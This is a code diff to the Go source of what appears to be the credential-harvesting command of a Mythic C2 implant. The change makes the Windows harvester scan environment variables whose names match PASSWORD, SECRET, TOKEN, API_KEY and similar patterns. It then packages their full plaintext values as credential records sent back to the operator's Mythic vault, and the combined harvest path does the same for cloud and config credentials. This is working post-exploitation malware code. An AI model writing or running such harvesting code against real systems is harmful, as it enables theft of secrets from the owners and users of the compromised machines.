@@ -103,6 +103,7 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 	// Credential-related environment variables
 	sb.WriteString("\n--- Sensitive Environment Variables ---\n")
 	envFound := false
+	var creds []structs.MythicCredential
 	sensitiveEnvPatterns := []string{
 		"PASSWORD", "SECRET", "TOKEN", "API_KEY", "APIKEY",
 		"CREDENTIAL", "AUTH", "ACCESS_KEY", "PRIVATE_KEY",
@@ -123,6 +124,15 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 					display = display[:25] + "..." + display[len(display)-15:]
 				}
 				sb.WriteString(fmt.Sprintf("  %s=%s\n", parts[0], display))
+
+				// Report sensitive env vars to Mythic vault
+				creds = append(creds, structs.MythicCredential{
+					CredentialType: "plaintext",
+					Realm:          "Windows",
+					Account:        parts[0],
+					Credential:     value,
+					Comment:        "cred-harvest windows env",
+				})
 				break
 			}
 		}
@@ -162,32 +172,50 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 func credAllWindows(args credHarvestArgs) structs.CommandResult {
 	var sb strings.Builder
+	var allCreds []structs.MythicCredential
 
 	windows := credWindows(args)
 	sb.WriteString(windows.Output)
 	sb.WriteString("\n")
+	if windows.Credentials != nil {
+		allCreds = append(allCreds, *windows.Credentials...)
+	}
 
 	cloud := credCloud(args)
 	sb.WriteString(cloud.Output)
 	sb.WriteString("\n")
+	if cloud.Credentials != nil {
+		allCreds = append(allCreds, *cloud.Credentials...)
+	}
 
 	configs := credConfigs(args)
 	sb.WriteString(configs.Output)
+	if configs.Credentials != nil {
+		allCreds = append(allCreds, *configs.Credentials...)
+	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(allCreds) > 0 {
+		result.Credentials = &allCreds
+	}
+	return result
 }
 
 // getUserHomes returns user home directories on Windows
